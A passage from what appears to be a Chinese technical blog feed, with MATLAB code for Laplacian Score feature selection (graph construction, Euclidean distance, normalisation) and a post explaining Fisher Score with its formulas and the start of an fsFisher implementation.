class="hljs-number">1</span>)+<span class="hljs-number">1</span>:<span class="hljs-built_in">i</span>*BlockSize*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">3</span>) = dump(:);                <span class="hljs-keyword">else</span>                    G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:<span class="hljs-built_in">i</span>*BlockSize*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">3</span>) = <span class="hljs-number">1</span>;                <span class="hljs-keyword">end</span>            <span class="hljs-keyword">end</span>        <span class="hljs-keyword">end</span>        W = sparse(G(:,<span class="hljs-number">1</span>),G(:,<span class="hljs-number">2</span>),G(:,<span class="hljs-number">3</span>),nSmp,nSmp);    <span class="hljs-keyword">else</span>        G = <span class="hljs-built_in">zeros</span>(nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">3</span>);        <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:<span class="hljs-built_in">ceil</span>(nSmp/BlockSize)            <span class="hljs-keyword">if</span> <span class="hljs-built_in">i</span> == <span class="hljs-built_in">ceil</span>(nSmp/BlockSize)                smpIdx = (<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize+<span class="hljs-number">1</span>:nSmp;                dist = fea(smpIdx,:)*fea';                dist = full(dist);                <span class="hljs-keyword">if</span> bSpeed                    nSmpNow = <span class="hljs-built_in">length</span>(smpIdx);                    dump = <span class="hljs-built_in">zeros</span>(nSmpNow,options.k+<span class="hljs-number">1</span>);                    idx = dump;                    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>                        [dump(:,<span class="hljs-built_in">j</span>),idx(:,<span class="hljs-built_in">j</span>)] = <span class="hljs-built_in">max</span>(dist,[],<span class="hljs-number">2</span>);                        temp = (idx(:,<span class="hljs-built_in">j</span>)<span class="hljs-number">-1</span>)*nSmpNow+[<span class="hljs-number">1</span>:nSmpNow]';                        dist(temp) = <span class="hljs-number">0</span>;                    <span class="hljs-keyword">end</span>                <span class="hljs-keyword">else</span>                    [dump idx] = <span class="hljs-built_in">sort</span>(-dist,<span class="hljs-number">2</span>); <span class="hljs-comment">% sort each row</span>                    idx = idx(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                    dump = -dump(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                <span class="hljs-keyword">end</span>                G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">1</span>) = <span class="hljs-built_in">repmat</span>(smpIdx',[options.k+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]);                G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">2</span>) = idx(:);                G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:nSmp*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">3</span>) = dump(:);            <span class="hljs-keyword">else</span>                smpIdx = (<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize+<span class="hljs-number">1</span>:<span class="hljs-built_in">i</span>*BlockSize;                dist = fea(smpIdx,:)*fea';                dist = full(dist);                                <span class="hljs-keyword">if</span> bSpeed                    nSmpNow = <span class="hljs-built_in">length</span>(smpIdx);                    dump = <span class="hljs-built_in">zeros</span>(nSmpNow,options.k+<span class="hljs-number">1</span>);                    idx = dump;                    <span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>                        [dump(:,<span class="hljs-built_in">j</span>),idx(:,<span class="hljs-built_in">j</span>)] = <span class="hljs-built_in">max</span>(dist,[],<span class="hljs-number">2</span>);                        temp = (idx(:,<span class="hljs-built_in">j</span>)<span class="hljs-number">-1</span>)*nSmpNow+[<span class="hljs-number">1</span>:nSmpNow]';                        dist(temp) = <span class="hljs-number">0</span>;                    <span class="hljs-keyword">end</span>                <span class="hljs-keyword">else</span>                    [dump idx] = <span class="hljs-built_in">sort</span>(-dist,<span class="hljs-number">2</span>); <span class="hljs-comment">% sort each row</span>                    idx = idx(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                    dump = -dump(:,<span class="hljs-number">1</span>:options.k+<span class="hljs-number">1</span>);                <span class="hljs-keyword">end</span>                G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:<span class="hljs-built_in">i</span>*BlockSize*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">1</span>) = <span class="hljs-built_in">repmat</span>(smpIdx',[options.k+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]);                G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:<span class="hljs-built_in">i</span>*BlockSize*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">2</span>) = idx(:);                G((<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)*BlockSize*(options.k+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>:<span class="hljs-built_in">i</span>*BlockSize*(options.k+<span class="hljs-number">1</span>),<span class="hljs-number">3</span>) = dump(:);            <span class="hljs-keyword">end</span>        <span class="hljs-keyword">end</span>        W = sparse(G(:,<span class="hljs-number">1</span>),G(:,<span class="hljs-number">2</span>),G(:,<span class="hljs-number">3</span>),nSmp,nSmp);    <span class="hljs-keyword">end</span>        <span class="hljs-keyword">if</span> bBinary        W(logical(W)) = <span class="hljs-number">1</span>;    <span class="hljs-keyword">end</span>        <span class="hljs-keyword">if</span> isfield(options,<span class="hljs-string">'bSemiSupervised'</span>) &amp;&amp; options.bSemiSupervised        tmpgnd = options.gnd(options.semiSplit);                Label = unique(tmpgnd);        nLabel = <span class="hljs-built_in">length</span>(Label);        G = <span class="hljs-built_in">zeros</span>(sum(options.semiSplit),sum(options.semiSplit));        <span class="hljs-keyword">for</span> idx=<span class="hljs-number">1</span>:nLabel            classIdx = tmpgnd==Label(idx);            G(classIdx,classIdx) = <span class="hljs-number">1</span>;        <span class="hljs-keyword">end</span>        Wsup = sparse(G);        <span class="hljs-keyword">if</span> ~isfield(options,<span class="hljs-string">'SameCategoryWeight'</span>)            options.SameCategoryWeight = <span class="hljs-number">1</span>;        <span class="hljs-keyword">end</span>        W(options.semiSplit,options.semiSplit) = (Wsup&gt;<span class="hljs-number">0</span>)*options.SameCategoryWeight;    <span class="hljs-keyword">end</span>        <span class="hljs-keyword">if</span> ~options.bSelfConnected        W = W - <span class="hljs-built_in">diag</span>(<span class="hljs-built_in">diag</span>(W));    <span class="hljs-keyword">end</span>    <span class="hljs-keyword">if</span> isfield(options,<span class="hljs-string">'bTrueKNN'</span>) &amp;&amp; options.bTrueKNN            <span class="hljs-keyword">else</span>        W = <span class="hljs-built_in">max</span>(W,W');    <span class="hljs-keyword">end</span>        <span class="hljs-keyword">return</span>;<span class="hljs-keyword">end</span><span class="hljs-comment">% strcmpi(options.NeighborMode,'KNN') &amp; (options.k == 0)</span><span class="hljs-comment">% Complete Graph</span><span class="hljs-keyword">switch</span> lower(options.WeightMode)    <span class="hljs-keyword">case</span> {lower(<span class="hljs-string">'Binary'</span>)}        error(<span class="hljs-string">'Binary weight can not be used for complete graph!'</span>);    <span class="hljs-keyword">case</span> {lower(<span class="hljs-string">'HeatKernel'</span>)}        W = EuDist2(fea,[],<span class="hljs-number">0</span>);        W = <span class="hljs-built_in">exp</span>(-W/(<span class="hljs-number">2</span>*options.t^<span class="hljs-number">2</span>));    <span class="hljs-keyword">case</span> {lower(<span class="hljs-string">'Cosine'</span>)}        W = full(Normfea*Normfea');    <span class="hljs-keyword">otherwise</span>        error(<span class="hljs-string">'WeightMode does not exist!'</span>);<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> ~options.bSelfConnected    <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(W,<span class="hljs-number">1</span>)        W(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">i</span>) = <span class="hljs-number">0</span>;    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span>W = <span class="hljs-built_in">max</span>(W,W');</code></pre></div><h3 id="EuDist2-m"><a href="#EuDist2-m" class="headerlink" title="EuDist2.m"></a>EuDist2.m</h3><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">D</span> = <span class="hljs-title">EuDist2</span><span class="hljs-params">(fea_a,fea_b,bSqrt)</span></span><span class="hljs-comment">%EUDIST2 Efficiently Compute the Euclidean Distance Matrix by Exploring the</span><span class="hljs-comment">%Matlab matrix operations.</span><span class="hljs-comment">%</span><span class="hljs-comment">%   D = EuDist(fea_a,fea_b)</span><span class="hljs-comment">%   fea_a:    nSample_a * nFeature</span><span class="hljs-comment">%   fea_b:    nSample_b * nFeature</span><span class="hljs-comment">%   D:      nSample_a * nSample_a</span><span class="hljs-comment">%       or  nSample_a * nSample_b</span><span class="hljs-comment">%</span><span class="hljs-comment">%    Examples:</span><span class="hljs-comment">%</span><span class="hljs-comment">%       a = rand(500,10);</span><span class="hljs-comment">%       b = rand(1000,10);</span><span class="hljs-comment">%</span><span class="hljs-comment">%       A = EuDist2(a); % A: 500*500</span><span class="hljs-comment">%       D = EuDist2(a,b); % D: 500*1000</span><span class="hljs-comment">%</span><span class="hljs-comment">%   version 2.1 --November/2011</span><span class="hljs-comment">%   version 2.0 --May/2009</span><span class="hljs-comment">%   version 1.0 --November/2005</span><span class="hljs-comment">%</span><span class="hljs-comment">%   Written by Deng Cai (dengcai AT gmail.com)</span><span class="hljs-keyword">if</span> ~exist(<span class="hljs-string">'bSqrt'</span>,<span class="hljs-string">'var'</span>)    bSqrt = <span class="hljs-number">1</span>;<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> (~exist(<span class="hljs-string">'fea_b'</span>,<span class="hljs-string">'var'</span>)) || <span class="hljs-built_in">isempty</span>(fea_b)    aa = sum(fea_a.*fea_a,<span class="hljs-number">2</span>);    ab = fea_a*fea_a';        <span class="hljs-keyword">if</span> issparse(aa)        aa = full(aa);    <span class="hljs-keyword">end</span>        D = <span class="hljs-built_in">bsxfun</span>(@plus,aa,aa') - <span class="hljs-number">2</span>*ab;    D(D&lt;<span class="hljs-number">0</span>) = <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> bSqrt        D = <span class="hljs-built_in">sqrt</span>(D);    <span class="hljs-keyword">end</span>    D = <span class="hljs-built_in">max</span>(D,D');<span class="hljs-keyword">else</span>    aa = sum(fea_a.*fea_a,<span class="hljs-number">2</span>);    bb = sum(fea_b.*fea_b,<span class="hljs-number">2</span>);    ab = fea_a*fea_b';    <span class="hljs-keyword">if</span> issparse(aa)        aa = full(aa);        bb = full(bb);    <span class="hljs-keyword">end</span>    D = <span class="hljs-built_in">bsxfun</span>(@plus,aa,bb') - <span class="hljs-number">2</span>*ab;    D(D&lt;<span class="hljs-number">0</span>) = <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> bSqrt        D = <span class="hljs-built_in">sqrt</span>(D);    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre></div><h3 id="LaplacianScore-m"><a href="#LaplacianScore-m" class="headerlink" title="LaplacianScore.m"></a>LaplacianScore.m</h3><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[Y]</span> = <span class="hljs-title">LaplacianScore</span><span class="hljs-params">(X, W)</span></span><span class="hljs-comment">%Usage:</span><span class="hljs-comment">%[Y] = LaplacianScore(X, W)</span><span class="hljs-comment">%</span><span class="hljs-comment">%X: Rows of vectors of data points</span><span class="hljs-comment">%W: The affinity matrix.</span><span class="hljs-comment">%Y: Vector of (1-LaplacianScore) for each feature.</span><span class="hljs-comment">%      The features with larger y are more important.</span><span class="hljs-comment">%</span><span class="hljs-comment">%    Examples:</span><span class="hljs-comment">%</span><span class="hljs-comment">%       fea = rand(50,70);</span><span class="hljs-comment">%       options = [];</span><span class="hljs-comment">%       options.Metric = 'Cosine';</span><span class="hljs-comment">%       options.NeighborMode = 'KNN';</span><span class="hljs-comment">%       options.k = 5;</span><span class="hljs-comment">%       options.WeightMode = 'Cosine';</span><span class="hljs-comment">%       W = constructW(fea,options);</span><span class="hljs-comment">% </span><span class="hljs-comment">%       LaplacianScore = LaplacianScore(fea,W);</span><span class="hljs-comment">%       [junk, index] = sort(-LaplacianScore);</span><span class="hljs-comment">%       </span><span class="hljs-comment">%       newfea = fea(:,index);</span><span class="hljs-comment">%       %the features in newfea will be sorted based on their importance.</span><span class="hljs-comment">%</span><span class="hljs-comment">%Type "LaplacianScore" for a self-demo.</span><span class="hljs-comment">%</span><span class="hljs-comment">% See also constructW</span><span class="hljs-comment">%</span><span class="hljs-comment">%Reference:</span><span class="hljs-comment">%</span><span class="hljs-comment">%   Xiaofei He, Deng Cai and Partha Niyogi, "Laplacian Score for Feature Selection".</span><span class="hljs-comment">%   Advances in Neural Information Processing Systems 18 (NIPS 2005),</span><span class="hljs-comment">%   Vancouver, Canada, 2005.   </span><span class="hljs-comment">%</span><span class="hljs-comment">%   Deng Cai, 2004/08+</span><span class="hljs-comment">% if nargin == 0, selfdemo; return; end</span>[nSmp,nFea] = <span class="hljs-built_in">size</span>(X);<span class="hljs-keyword">if</span> <span class="hljs-built_in">size</span>(W,<span class="hljs-number">1</span>) ~= nSmp<span class="hljs-comment">%若数据集有m个样本，则W为m行m列的矩阵</span>    error(<span class="hljs-string">'W is error'</span>);<span class="hljs-keyword">end</span>D = full(sum(W,<span class="hljs-number">2</span>));<span class="hljs-comment">%若数据集有m个样本，则D为m行1列的矩阵</span>L = W;allone = <span class="hljs-built_in">ones</span>(nSmp,<span class="hljs-number">1</span>);tmp1 = D'*X;D = sparse(<span class="hljs-number">1</span>:nSmp,<span class="hljs-number">1</span>:nSmp,D,nSmp,nSmp);<span class="hljs-comment">%建立稀疏矩阵</span>DPrime = sum((X'*D)'.*X)-tmp1.*tmp1/sum(<span class="hljs-built_in">diag</span>(D));LPrime = sum((X'*L)'.*X)-tmp1.*tmp1/sum(<span class="hljs-built_in">diag</span>(D));DPrime(<span class="hljs-built_in">find</span>(DPrime &lt; <span class="hljs-number">1e-12</span>)) = <span class="hljs-number">10000</span>;Y = LPrime./DPrime;Y = Y';Y = full(Y);</code></pre></div><h3 id="LS-final-m"><a href="#LS-final-m" class="headerlink" title="LS_final.m"></a>LS_final.m</h3><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[redu,LS,List]</span> = <span class="hljs-title">LS_final</span><span class="hljs-params">(X,Y,selectrate)</span></span><span class="hljs-comment">%laplacian score</span><span class="hljs-comment">%input:   X, the data, each row is an instance</span><span class="hljs-comment">%            Y, the label in 1 2 3 ... format</span><span class="hljs-comment">%           selectrate， 0.1 0.2 0.3...0.9选择的属性数目占总属性数目的比例</span><span class="hljs-comment">%output</span><span class="hljs-comment">%      redu %if selectrate=0.5, redu为top 50% 的属性</span><span class="hljs-comment">%     LS%各个特征的Fisher score得分</span><span class="hljs-comment">%     List%各个特征按照Fisher score得分排序</span><span class="hljs-comment">% % load iris.dat</span><span class="hljs-comment">% [redu,LS,List]=LS_final(iris(:,1:end-1),iris(:,end),0.5)</span><span class="hljs-comment">% numC = max(Y);%类别数目</span>[~, numF] = <span class="hljs-built_in">size</span>(X);<span class="hljs-comment">%特征总数numF</span>m=<span class="hljs-built_in">ceil</span>(selectrate*numF);<span class="hljs-comment">%最终选择的属性的数目</span>a=[X,Y];mfilename=<span class="hljs-string">'LaplacianScore'</span>;feaNorm = mynorm(a(:,<span class="hljs-number">1</span>:<span class="hljs-keyword">end</span><span class="hljs-number">-1</span>),<span class="hljs-number">2</span>);<span class="hljs-comment">%mynorm(iris(:,1:end-1),2);%%%%%%%%%%%%%</span>[~,n]=<span class="hljs-built_in">size</span>(a);fea = a(:,<span class="hljs-number">1</span>:<span class="hljs-keyword">end</span><span class="hljs-number">-1</span>) ./ <span class="hljs-built_in">repmat</span>(<span class="hljs-built_in">max</span>(<span class="hljs-number">1e-10</span>,feaNorm),<span class="hljs-number">1</span>,n<span class="hljs-number">-1</span>);options = [];options.Metric = <span class="hljs-string">'Cosine'</span>;options.NeighborMode = <span class="hljs-string">'KNN'</span>;options.WeightMode = <span class="hljs-string">'Cosine'</span>;options.k = <span class="hljs-number">3</span>;W = constructW(fea,options);[LS] = feval(mfilename,a(:,<span class="hljs-number">1</span>:<span class="hljs-keyword">end</span><span class="hljs-number">-1</span>),W);<span class="hljs-comment">%feval求函数的值</span>[~, List] = <span class="hljs-built_in">sort</span>(LS', <span class="hljs-string">'descend'</span>);<span class="hljs-comment">%各个特征的排序</span>redu=List(<span class="hljs-number">1</span>:m);</code></pre></div><h3 id="mynorm-m"><a href="#mynorm-m" class="headerlink" title="mynorm.m"></a>mynorm.m</h3><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">V</span> = <span class="hljs-title">mynorm</span><span class="hljs-params">(M,dim)</span></span><span class="hljs-comment">%   MYNORM: 计算矩阵某个维度上的向量的2范数</span><span class="hljs-comment">%   V = mynorm(M,dim);  沿第dim维计算向量2范数</span><span class="hljs-comment">%   V = mynorm(M);      求列向量的模，相当于V = mynorm(M,1);</span><span class="hljs-keyword">if</span> (nargin == <span class="hljs-number">1</span>)    dim = <span class="hljs-number">1</span>;<span class="hljs-keyword">elseif</span> (nargin &gt; <span class="hljs-number">2</span>)    error(<span class="hljs-string">'only accept inputs.'</span>);<span class="hljs-keyword">end</span>V = sum(M.^<span class="hljs-number">2</span>,dim).^<span class="hljs-number">.5</span>;</code></pre></div><h3 id="NormalizeFea-m"><a href="#NormalizeFea-m" class="headerlink" title="NormalizeFea.m"></a>NormalizeFea.m</h3><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fea</span> = <span class="hljs-title">NormalizeFea</span><span class="hljs-params">(fea,row,norm)</span></span><span class="hljs-comment">% if row == 1, normalize each row of fea to have unit norm;</span><span class="hljs-comment">% if row == 0, normalize each column of fea to have unit norm;</span><span class="hljs-comment">%</span><span class="hljs-comment">% if norm == p, use p-norm, default norm=2;</span><span class="hljs-comment">% </span><span class="hljs-comment">%   version 4.0 --May/2016 </span><span class="hljs-comment">%   version 3.0 --Jan/2012 </span><span class="hljs-comment">%   version 2.0 --Jan/2012 </span><span class="hljs-comment">%   version 1.0 --Oct/2003 </span><span class="hljs-comment">%</span><span class="hljs-comment">%   Written by Deng Cai (dengcai AT gmail.com)</span><span class="hljs-comment">%              Wei Qian (qwqjzju@gmail.com)</span><span class="hljs-keyword">if</span> ~exist(<span class="hljs-string">'row'</span>,<span class="hljs-string">'var'</span>)    row = <span class="hljs-number">1</span>;<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> ~exist(<span class="hljs-string">'norm'</span>,<span class="hljs-string">'var'</span>)    norm = <span class="hljs-number">2</span>;<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> norm &lt; <span class="hljs-number">1</span>    error(<span class="hljs-string">'It is not a norm when p small than 1!'</span>);<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> row    nSmp = <span class="hljs-built_in">size</span>(fea,<span class="hljs-number">1</span>);    feaNorm = <span class="hljs-built_in">max</span>(<span class="hljs-number">1e-14</span>,full(sum(<span class="hljs-built_in">abs</span>(fea).^norm,<span class="hljs-number">2</span>)));    fea = spdiags(feaNorm.^-(<span class="hljs-number">1.</span>/norm),<span class="hljs-number">0</span>,nSmp,nSmp)*fea;<span class="hljs-keyword">else</span>    nSmp = <span class="hljs-built_in">size</span>(fea,<span class="hljs-number">2</span>);    feaNorm = <span class="hljs-built_in">max</span>(<span class="hljs-number">1e-14</span>,full(sum(<span class="hljs-built_in">abs</span>(fea).^norm,<span class="hljs-number">1</span>))');    fea = fea*spdiags(feaNorm.^-(<span class="hljs-number">1.</span>/norm),<span class="hljs-number">0</span>,nSmp,nSmp);<span class="hljs-keyword">end</span>            <span class="hljs-keyword">return</span>;<span class="hljs-keyword">if</span> row    [nSmp, mFea] = <span class="hljs-built_in">size</span>(fea);    <span class="hljs-keyword">if</span> issparse(fea)        fea2 = fea';        feaNorm = mynorm(fea2,<span class="hljs-number">1</span>);        <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:nSmp            fea2(:,<span class="hljs-built_in">i</span>) = fea2(:,<span class="hljs-built_in">i</span>) ./ <span class="hljs-built_in">max</span>(<span class="hljs-number">1e-10</span>,feaNorm(<span class="hljs-built_in">i</span>));        <span class="hljs-keyword">end</span>        fea = fea2';    <span class="hljs-keyword">else</span>        feaNorm = sum(fea.^<span class="hljs-number">2</span>,<span class="hljs-number">2</span>).^<span class="hljs-number">.5</span>;        fea = fea./feaNorm(:,<span class="hljs-built_in">ones</span>(<span class="hljs-number">1</span>,mFea));    <span class="hljs-keyword">end</span><span class="hljs-keyword">else</span>    [mFea, nSmp] = <span class="hljs-built_in">size</span>(fea);    <span class="hljs-keyword">if</span> issparse(fea)        feaNorm = mynorm(fea,<span class="hljs-number">1</span>);        <span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:nSmp            fea(:,<span class="hljs-built_in">i</span>) = fea(:,<span class="hljs-built_in">i</span>) ./ <span class="hljs-built_in">max</span>(<span class="hljs-number">1e-10</span>,feaNorm(<span class="hljs-built_in">i</span>));        <span class="hljs-keyword">end</span>    <span class="hljs-keyword">else</span>        feaNorm = sum(fea.^<span class="hljs-number">2</span>,<span class="hljs-number">1</span>).^<span class="hljs-number">.5</span>;        fea = fea./feaNorm(<span class="hljs-built_in">ones</span>(<span class="hljs-number">1</span>,mFea),:);    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre></div><h3 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h3><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">%LS_final<span class="hljs-keyword">the</span> main <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">of</span> <span class="hljs-title">laplacian</span> <span class="hljs-title">score</span>. <span class="hljs-title">this</span> <span class="hljs-title">program</span> <span class="hljs-title">computes</span> <span class="hljs-title">the</span> <span class="hljs-title">laplacian</span> <span class="hljs-title">score</span> <span class="hljs-title">and</span> </span><span class="hljs-built_in">sort</span> attributes <span class="hljs-keyword">in</span> <span class="hljs-keyword">descending</span> order <span class="hljs-keyword">in</span> terms <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> laplacian scores%LaplacianScorecompute <span class="hljs-keyword">the</span> laplacian score% examplethis is <span class="hljs-keyword">an</span> example <span class="hljs-keyword">of</span> how <span class="hljs-built_in">to</span> use this program <span class="hljs-keyword">for</span> feature selection</code></pre></div><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://blog.csdn.net/zhenaoxi1077/article/details/82791281" target="_blank" rel="noopener">常用的特征选择方法</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 特征工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>特征选择FisherScore</title>
      <link href="/2020/11/03/%E7%89%B9%E5%BE%81%E9%80%89%E6%8B%A9FisherScore/"/>
      <url>/2020/11/03/%E7%89%B9%E5%BE%81%E9%80%89%E6%8B%A9FisherScore/</url>
      
        <content type="html"><![CDATA[<p>特征选择方法FisherScore</p><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>如果了解过数学建模，那么你一定会听说过主成分分析。事实上，数学建模比赛很少用到主成分分析，主要是烂大街了，但不得不说……主成分分析解决某些问题的时候还是挺香的。</p><p>主成分分析是一种特征提取方法（对的，不是特征选择方法），主成分分析常用于降维，但有个问题是经过主成分分析降维后的数据不是原数据的子集（特征子空间）。这样的数据并不利于开展后续的一些工作。在这里介绍一种比较常用的特征选择方法。</p><h2 id="特征选择方法"><a href="#特征选择方法" class="headerlink" title="特征选择方法"></a>特征选择方法</h2><p>特征选择方法主要分为三类：1）Filter（过滤式）； 2）Wrapper（包裹式） ；3） Embedded（嵌入式） 。</p><ul><li><p>Filter方法（过滤式）</p><p>​    对每个特征“打分”，然后依据权重排序。</p><p>常见方法：</p><ul><li>Chi-squared test（卡方检验）</li><li>Information gain（信息增益）</li><li>Correlation coefficient scores（相关系数）</li><li>Wrapper方法（包裹式）</li></ul><p>将子集的选择看作是一个搜索寻优问题，生成不同的组合，比较。这样就将子集的选择看作是一个优化问题，这里有很多的优化算法可以解决，如GA、PSO（如：优化算法-粒子群算法）、DE、ABC（如：优化算法-人工蜂群算法）等。</p><p>常见方法：</p><p> 递归特征消除算法 </p></li></ul><ul><li><p>Embedded方法（嵌入式）</p><p>在模型既定的情况下学习出对提高模型准确性最好的特征。也就是在确定模型的过程中，挑选出那些对模型的训练有重要意义的特征。</p><p>常见方法：</p><p>简单易学的机器学习算法–岭回归（Ridge Regression），就是线性回归过程加入了L2正则项。</p></li></ul><h2 id="FisherScore"><a href="#FisherScore" class="headerlink" title="FisherScore"></a>FisherScore</h2><h3 id="数学原理"><a href="#数学原理" class="headerlink" title="数学原理"></a>数学原理</h3><p>Fisher Score是目前较为广泛使用的一种有监督的特征选择方法, 原理较为简单，其核心思想是在最大化类间散度的同时最小化类内散度. 设数据集为${ z_i,y_i },i=1,2..,N$ ,其中$z_i \in R^{N \times 1}$为数据特征, $y_i \in {1,2,…,C } $为类别标签, $D$ 为数据维数, $C$ 为类别总数, $N$ 是样本个数,其中 $tr(·)$ 表示矩阵的迹, 则数据矩阵$z_i \in R^{D \times N}$的Fisher Score 其定义为：<br>$$<br>FS(Z)=tr{(S_t)^{-1}S_b}<br>$$<br>类间散度矩阵：<br>$$<br>S_b=\sum_{i=1}^Cn_i(r_i-r)(r_i-r)^T<br>$$<br>总散度矩阵 ：<br>$$<br>S_t=\sum_{j=1}^N(z_j-r)(z_j-r)^T<br>$$<br>其中$n_i$为第$i$类数据的个数，${ i }$为第$i$类数据下标的集合，</p><p>第$i$类数据的中心：<br>$$<br>r_i= \frac{1}{n_i} \sum_{j \in {i }Z_j }<br>$$<br>所有数据的中心:<br>$$<br>r = \frac{1}{N}\sum^N_{j=1}Z_j<br>$$<br>最终得到的FS即使为各个特征的分数，分数越高则表示该特征对标签的影响程度越高。</p><h3 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h3><p>FisherScore适用于对<strong>离散</strong>的数值作为因变量（即标签）筛选出特征评分。所有也有学者用这种方法来完成图像分类。。。</p><p>没了，之后再介绍一下<strong>Laplacian score</strong>吧~</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[redu,W,List]</span> = <span class="hljs-title">fsFisher</span><span class="hljs-params">(X,Y,selectrate)</span></span><span class="hljs-comment">%Fisher Score, use the N var formulation</span><span class="hljs-comment">%input:   X, the data, each row is an instance</span><span class="hljs-comment">%            Y, the label in 1 2 3 ... format</span><span class="hljs-comment">%           selectrate， 0.1 0.2 0.3...0.9选择的属性数目占总属性数目的比例</span><span class="hljs-comment">%output</span><span class="hljs-comment">%      redu %if selectrate=0.5, redu为top 50% 的属性</span><span class="hljs-comment">%     W%各个特征的Fisher score得分</span><span class="hljs-comment">%     List%各个特征按照Fisher score得分排序</span><span class="hljs-comment">%调用格式 [W,List]=fsFisher(c,d)</span>numC = <span class="hljs-built_in">max</span>(Y);<span class="hljs-comment">%类别数目</span>[~, numF] = <span class="hljs-built_in">size</span>(X);<span class="hljs-comment">%特征总数numF</span>m=<span class="hljs-built_in">ceil</span>(selectrate*numF);<span class="hljs-comment">%最终选择的属性的数目</span>W = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,numF);<span class="hljs-comment">% statistic for classes</span>cIDX = cell(numC,<span class="hljs-number">1</span>);<span class="hljs-comment">%cIDX存储属于某一类的样本</span>n_i = <span class="hljs-built_in">zeros</span>(numC,<span class="hljs-number">1</span>);<span class="hljs-comment">%n_i存储每一类的样本数</span><span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span>:numC    cIDX{<span class="hljs-built_in">j</span>} = <span class="hljs-built_in">find</span>(Y(:)==<span class="hljs-built_in">j</span>);    n_i(<span class="hljs-built_in">j</span>) = <span class="hljs-built_in">length</span>(cIDX{<span 